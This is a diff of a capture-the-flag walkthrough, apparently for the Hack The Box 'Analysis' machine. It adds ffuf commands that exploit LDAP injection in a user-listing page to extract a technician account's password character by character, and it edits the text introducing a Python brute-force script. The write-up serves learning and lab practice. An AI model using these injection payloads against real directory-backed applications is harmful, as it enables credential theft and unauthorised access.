@@ -554,40 +554,60 @@ ________________________________________________
 
 $ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=9FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
 
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=9FUZZ*)
- :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/alphanum-case-extra.txt
- :: Follow redirects : false
- :: Calibration      : true
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Response size: 8
-________________________________________________
-
 7                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
 
 $ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
 
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97FUZZ*)
- :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/alphanum-case-extra.txt
- :: Follow redirects : false
- :: Calibration      : true
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Response size: 8
-________________________________________________
-
 N                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 40ms]
+
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+T                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+t                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+l                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+
+# here it outputs nothing, so we can infer that a special character exists
+# after trying some, `*` seems to do the trick
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+4                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+Q                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4QFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+P                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4QPFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+9                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4QP9FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+6                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4QP96FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+B                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4QP96BFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+v                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4QP96BvFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+                        [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
 ```
 
-The following [Python script](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/htb/fullpwn/analysis/brute-force.py) is used to brute-force `technician`'s password:
+The following [Python script](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/htb/fullpwn/analysis/brute-force.py) is a more efficient way to brute-force `technician`'s password:
 
 ```python
 import argparse
@@ -624,8 +644,6 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-
-- The above works until it hits the `*` --> This is bypassed by scripting a brute-force attack which includes special characters.
 
 If we run the above script:
 
